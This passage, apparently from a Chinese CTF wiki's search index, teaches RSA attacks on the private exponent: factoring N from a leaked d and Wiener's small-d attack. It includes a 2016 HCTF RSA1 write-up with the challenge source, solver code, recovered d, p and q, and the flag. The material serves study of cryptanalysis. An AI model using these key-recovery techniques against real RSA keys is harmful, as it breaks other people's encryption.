\u7684\u516c\u94a5\uff0c\u53d1\u73b0\u5b83\u7684 N \u4e0e\u4e0a\u4e00\u9053\u9898\u7684 N \u76f8\u540c\uff0c\u5e76\u4e14\u4e0a\u9898\u7684 N\uff0ce\uff0cd \u5df2\u77e5\u3002\u7531\u6b64\u53ef\u76f4\u63a5\u4f7f\u7528\u4e0a\u9762\u7684 \nrsatool.py\n \u5f97\u5230 p\uff0cq\uff0c\u5e76\u901a\u8fc7\u672c\u9898\u7684 e \u8ba1\u7b97\u51fa e \u5f97\u5230\u660e\u6587\u3002\n\n\nWiener's Attack\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u5728 d \u6bd4\u8f83\u5c0f\uff08\nd\n\\frac{1}{3}N^{\\frac{1}{4}}\nd<\\frac{1}{3}N^{\\frac{1}{4}}\n\uff09\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528 \nWiener's Attack\n \u6765\u83b7\u5f97\u79c1\u94a5\u3002\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\n\nhttps://en.wikipedia.org/wiki/Wiener%27s_attack\n\n\nhttps://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/\n\n\n\n\n\u5de5\u5177\n\n\n\n\nhttps://github.com/pablocelayes/rsa-wiener-attack\n\n\n\n\n\u7efc\u5408\u4f8b\u5b50\n\n\n2016 HCTF RSA1\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d RSA 1 - Crypto So Interesting \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\uff0c\n\u6e90\u4ee3\u7801\u94fe\u63a5\n\u3002\n\n\n\u9996\u5148\u5148\u7ed5\u8fc7\u7a0b\u5e8f\u7684 proof \u90e8\u5206\uff0c\u5dee\u4e0d\u591a\u4f7f\u7528\u4e00\u4e9b\u968f\u673a\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u3002\n\n\n\u5176\u6b21\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u4ee3\u7801\u90e8\u5206\uff0c\u7a0b\u5e8f\u662f\u6839\u636e\u6211\u4eec\u7684 token \u6765\u83b7\u53d6 flag \u7684\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u5229\u7528\u6e90\u4ee3\u7801\u4e2d\u63d0\u4f9b\u7684 token\u3002\n\n\n    \nprint\n \nThis is a RSA Decryption System\n\n    \nprint\n \nPlease enter Your team token: \n\n    \ntoken\n \n=\n \nraw_input\n()\n\n    \ntry\n:\n\n        \nflag\n \n=\n \nget_flag\n(\ntoken\n)\n\n        \nassert\n \nlen\n(\nflag\n)\n \n==\n \n38\n\n    \nexcept\n:\n\n        \nprint\n \nToken error!\n\n        \nm_exit\n(\n-\n1\n)\n\n\n\n\n\n\u63a5\u4e0b\u6765\u6211\u4eec\u9996\u5148\u77e5\u9053 \nn=pq\nn=pq\n\uff0c\u6211\u4eec\u518d\u6765\u4f60\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u4e2a e\uff0cd \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002\n\n\n    \np\n=\ngetPrime\n(\n2048\n)\n\n    \nq\n=\ngetPrime\n(\n2048\n)\n\n    \nn\n \n=\n \np\n \n*\n \nq\n\n    \ne\n,\n \nd\n \n=\n \nget_ed\n(\np\n,\n \nq\n)\n\n    \nprint\n \nn: \n,\n \nhex\n(\nn\n)\n\n    \nprint\n \ne: \n,\n \nhex\n(\ne\n)\n\n\n\n\n\nget_ed\n \u51fd\u6570\u5982\u4e0b\n\n\ndef\n \nget_ed\n(\np\n,\n \nq\n):\n\n    \nk\n \n=\n \ncal_bit\n(\nq\n*\np\n)\n\n    \nphi_n\n \n=\n \n(\np\n-\n1\n)\n*\n(\nq\n-\n1\n)\n\n    \nr\n \n=\n \nrandom\n.\nrandint\n(\n10\n,\n \n99\n)\n\n    \nwhile\n \nTrue\n:\n\n        \nu\n \n=\n \ngetPrime\n(\nk\n/\n4\n \n-\n \nr\n)\n\n        \nif\n \ngcd\n(\nu\n,\n \nphi_n\n)\n \n!=\n \n1\n:\n\n            \ncontinue\n\n        \nt\n \n=\n \ninvmod\n(\nu\n,\n \nphi_n\n)\n\n        \ne\n \n=\n \npi_b\n(\nt\n)\n\n        \nif\n \ngcd\n(\ne\n,\n \nphi_n\n)\n \n==\n \n1\n:\n\n            \nbreak\n\n    \nd\n \n=\n \ninvmod\n(\ne\n,\n \nphi_n\n)\n\n    \nreturn\n \n(\ne\n,\n \nd\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u5f97\u5230\u7684 u \u7684\u4f4d\u6570\u6bd4 n \u7684\u4f4d\u6570\u7684\u56db\u5206\u4e4b\u4e00\u8fd8\u8981\u5c11\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u5dee\u4e0d\u591a\u6ee1\u8db3\u4e86 Wiener's Attack \u4e86\u3002\u800c\u4e14\u6211\u4eec\u8ba1\u7b97\u51fa\u6765\u7684 u\uff0ct\uff0ce\uff0cd \u8fd8\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\n\n\n\n\n\n\\begin{align*}\nut \n\\equiv 1  \\bmod \\varphi(n) \\\\\net \n\\equiv 1 \\bmod bt \\\\\ned \n\\equiv 1 \\bmod \\varphi(n)\n\\end{align*}\n\n\n\n\n\\begin{align*}\nut &\\equiv 1  \\bmod \\varphi(n) \\\\\net &\\equiv 1 \\bmod bt \\\\\ned &\\equiv 1 \\bmod \\varphi(n)\n\\end{align*}\n\n\n\n\n\n\u6839\u636e\u9898\u4e2d\u7ed9\u51fa\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 n\uff0ce\uff0cbt\u3002\n\n\n\u6240\u4ee5\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u7b2c\u4e8c\u4e2a\u5f0f\u5b50\u77e5\u9053 e\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u4e2a\u5f0f\u5b50\u8fdb\u884c Wiener's Attack\uff0c\u83b7\u53d6 u\u3002\u8fdb\u800c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u79c1\u94a5\u6307\u6570\u6cc4\u9732\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u5206\u89e3 N \u4ece\u800c\u5f97\u5230 p\uff0cq\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230 d \u4e86\u3002\n\n\n\u9996\u5148\u6211\u4eec\u7ed5\u8fc7 proof \u5f97\u5230\u4e86 N\uff0ce\uff0c\u52a0\u5bc6\u540e\u7684 flag \u5982\u4e0b\n\n\nn:  0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451\ne:  0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1\nflag:  0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df\n\n\n\n\n\u5176\u6b21\u4f7f\u7528\u5982\u4e0b\u65b9\u6cd5\u8fdb\u884c Wiener's Attack \u5f97\u5230 u\uff0c\u5982\u4e0b\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nbt\n \n=\n \nn\n    \ne\n \n=\n \n0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1\n\n    \nt\n \n=\n \ngmpy2\n.\ninvert\n(\ne\n,\n \nbt\n)\n\n    \nn\n \n=\n \n0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451\n\n    \nsolve\n(\nn\n,\n \nt\n)\n\n\n\n\n\n\u5176\u4e2d solve \u51fd\u6570\u5c31\u662f\u5bf9\u5e94\u7684 Wiener's Attack \u7684\u51fd\u6570\u3002\n\n\n\u6211\u4eec\u5f97\u5230\u4e86 u\uff0c\u5982\u4e0b\n\n\n\u279c  rsa-wiener-attack git:\n(\nmaster\n)\n \u2717 python RSAwienerHacker.py\nTesting Wiener Attack\nHacked!\n\n(\nhacked_d = \n, mpz\n(\n404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L\n))\n\n-------------------------\nHacked!\n\n(\nhacked_d = \n, mpz\n(\n404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L\n))\n\n-------------------------\nHacked!\n\n(\nhacked_d = \n, mpz\n(\n404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L\n))\n\n-------------------------\nHacked!\n\n(\nhacked_d = \n, mpz\n(\n404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L\n))\n\n-------------------------\nHacked!\n\n(\nhacked_d = \n, mpz\n(\n404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L\n))\n\n\n\n\n\n\u63a5\u7740\u5229\u7528 RsaConverter \u4ee5\u53ca u\uff0ct\uff0cn \u83b7\u53d6\u5bf9\u5e94\u7684 p \u548c q\u3002\u5982\u4e0b\n\n\n94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381\n8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1\n\n\n\n\n\u7136\u540e\u6211\u4eec\u76f4\u63a5\u53bb\u83b7\u5f97 d\uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u6062\u590d\u660e\u6587\n\n\n    \np\n \n=\n \n0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381\n\n    \nq\n \n=\n \n0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1\n\n    \nif\n \np\n \n*\n \nq\n \n==\n \nn\n:\n\n        \nprint\n \ntrue\n\n    \nphin\n \n=\n \n(\np\n \n-\n \n1\n)\n \n*\n \n(\nq\n \n-\n \n1\n)\n\n    \nd\n \n=\n \ngmpy2\n.\ninvert\n(\ne\n,\n \nphin\n)\n\n    \ncipher\n \n=\n \n0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df\n\n    \nflag\n \n=\n \ngmpy2\n.\npowmod\n(\ncipher\n,\n \nd\n,\n \nn\n)\n\n    \nprint\n \nlong_to_bytes\n(\nflag\n)\n\n\n\n\n\n\u5f97\u5230 flag\n\n\ntrue\n\nhctf\n{\nd8e8fca2dc0f896fd7cb4cb0031ba249\n}", 
            "title": "\u79c1\u94a5 d \u76f8\u5173\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/#d", 
            "text": "", 
            "title": "d \u6cc4\u9732\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/#_1", 
            "text": "\u9996\u5148\u5f53 d \u6cc4\u9732\u4e4b\u540e\uff0c\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u89e3\u5bc6\u6240\u6709\u52a0\u5bc6\u7684\u6d88\u606f\u3002\u6211\u4eec\u751a\u81f3\u8fd8\u53ef\u4ee5\u5bf9\u6a21\u6570 N \u8fdb\u884c\u5206\u89e3\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b  \u6211\u4eec\u77e5\u9053  ed \\equiv 1 \\bmod \\varphi(n) ed \\equiv 1 \\bmod \\varphi(n) \uff0c\u90a3\u4e48  \\varphi(n) | k=ed-1 \\varphi(n) | k=ed-1 \u3002\u663e\u7136 k \u662f\u4e00\u4e2a\u5076\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4  k=2^tr k=2^tr \uff0c\u5176\u4e2d r \u4e3a\u5947\u6570\uff0ct \u4e0d\u5c0f\u4e8e 1\u3002\u90a3\u4e48\u5bf9\u4e8e\u4efb\u4f55\u7684\u4e0e N \u4e92\u7d20\u7684\u6570 g\uff0c\u6211\u4eec\u90fd\u6709  g^k \\equiv 1 \\bmod n g^k \\equiv 1 \\bmod n \u3002\u90a3\u4e48  z=g^{\\frac{k}{2}} z=g^{\\frac{k}{2}}  \u662f\u6a21 N \u7684\u4e8c\u6b21\u65b9\u6839\u3002\u90a3\u4e48\u6211\u4eec\u6709   \nz^2 \\equiv 1 \\bmod p \\\\\nz^2 \\equiv 1 \\bmod q  \nz^2 \\equiv 1 \\bmod p \\\\\nz^2 \\equiv 1 \\bmod q   \u8fdb\u800c\u6211\u4eec\u6211\u4eec\u77e5\u9053\u65b9\u7a0b\u6709\u4ee5\u4e0b\u56db\u4e2a\u89e3\uff0c\u524d\u4e24\u4e2a\u662f   \nx \\equiv \\pm1 \\bmod N  \nx \\equiv \\pm1 \\bmod N   \u540e\u4e24\u4e2a\u662f  \\pm x \\pm x \uff0c\u5176\u4e2d x \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6   \nx \\equiv 1 \\bmod p \\\\\nx \\equiv -1 \\bmod q  \nx \\equiv 1 \\bmod p \\\\\nx \\equiv -1 \\bmod q   \u663e\u7136\uff0c z=g^{\\frac{k}{2}} z=g^{\\frac{k}{2}}  \u6ee1\u8db3\u7684\u662f\u540e\u9762\u90a3\u4e2a\u6761\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97  gcd(z-1,N) gcd(z-1,N)  \u6765\u5bf9 N \u8fdb\u884c\u5206\u89e3\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/#_2", 
            "text": "\u5229\u7528\u4ee5\u4e0b\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u8ba1\u7b97   RsaConverter.exe ( https://sourceforge.net/projects/rsaconverter/  , for windows )  rsatool.py", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/#2017-hitb-hack-in-the-card-ii", 
            "text": "The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -  publickey.pem). However it seems that they missed something...... \nCan you decrypt the following hex-encoded ciphertext this time?  016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977   \u8fd9\u9898\u662f\u63a5\u7eed 2017 HITB - hack in the card I \u7684\u4e00\u9053\u9898\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528  openssl  \u67e5\u770b  publickey.pem  \u7684\u516c\u94a5\uff0c\u53d1\u73b0\u5b83\u7684 N \u4e0e\u4e0a\u4e00\u9053\u9898\u7684 N \u76f8\u540c\uff0c\u5e76\u4e14\u4e0a\u9898\u7684 N\uff0ce\uff0cd \u5df2\u77e5\u3002\u7531\u6b64\u53ef\u76f4\u63a5\u4f7f\u7528\u4e0a\u9762\u7684  rsatool.py  \u5f97\u5230 p\uff0cq\uff0c\u5e76\u901a\u8fc7\u672c\u9898\u7684 e \u8ba1\u7b97\u51fa e \u5f97\u5230\u660e\u6587\u3002", 
            "title": "2017 HITB - hack in the card II"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/#wieners-attack", 
            "text": "", 
            "title": "Wiener's Attack"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/#_3", 
            "text": "\u5728 d \u6bd4\u8f83\u5c0f\uff08 d \\frac{1}{3}N^{\\frac{1}{4}} d<\\frac{1}{3}N^{\\frac{1}{4}} \uff09\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528  Wiener's Attack  \u6765\u83b7\u5f97\u79c1\u94a5\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/#_4", 
            "text": "https://en.wikipedia.org/wiki/Wiener%27s_attack  https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/#_5", 
            "text": "https://github.com/pablocelayes/rsa-wiener-attack", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/#_6", 
            "text": "", 
            "title": "\u7efc\u5408\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/#2016-hctf-rsa1", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d RSA 1 - Crypto So Interesting \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\uff0c \u6e90\u4ee3\u7801\u94fe\u63a5 \u3002  \u9996\u5148\u5148\u7ed5\u8fc7\u7a0b\u5e8f\u7684 proof \u90e8\u5206\uff0c\u5dee\u4e0d\u591a\u4f7f\u7528\u4e00\u4e9b\u968f\u673a\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u3002  \u5176\u6b21\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u4ee3\u7801\u90e8\u5206\uff0c\u7a0b\u5e8f\u662f\u6839\u636e\u6211\u4eec\u7684 token \u6765\u83b7\u53d6 flag \u7684\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u5229\u7528\u6e90\u4ee3\u7801\u4e2d\u63d0\u4f9b\u7684 token\u3002       print   This is a RSA Decryption System \n     print   Please enter Your team token:  \n     token   =   raw_input () \n     try : \n         flag   =   get_flag ( token ) \n         assert   len ( flag )   ==   38 \n     except : \n         print   Token error! \n         m_exit ( - 1 )   \u63a5\u4e0b\u6765\u6211\u4eec\u9996\u5148\u77e5\u9053  n=pq n=pq \uff0c\u6211\u4eec\u518d\u6765\u4f60\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u4e2a e\uff0cd \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002       p = getPrime ( 2048 ) \n     q = getPrime ( 2048 ) \n     n   =   p   *   q \n     e ,   d   =   get_ed ( p ,   q ) \n     print   n:  ,   hex ( n ) \n     print   e:  ,   hex ( e )   get_ed  \u51fd\u6570\u5982\u4e0b  def   get_ed ( p ,   q ): \n     k   =   cal_bit ( q * p ) \n     phi_n   =   ( p - 1 ) * ( q - 1 ) \n     r   =   random . randint ( 10 ,   99 ) \n     while   True : \n         u   =   getPrime ( k / 4   -   r ) \n         if   gcd ( u ,   phi_n )   !=   1 : \n             continue \n         t   =   invmod ( u ,   phi_n ) \n         e   =   pi_b ( t ) \n         if   gcd ( e ,   phi_n )   ==   1 : \n             break \n     d   =   invmod ( e ,   phi_n ) \n     return   ( e ,   d )   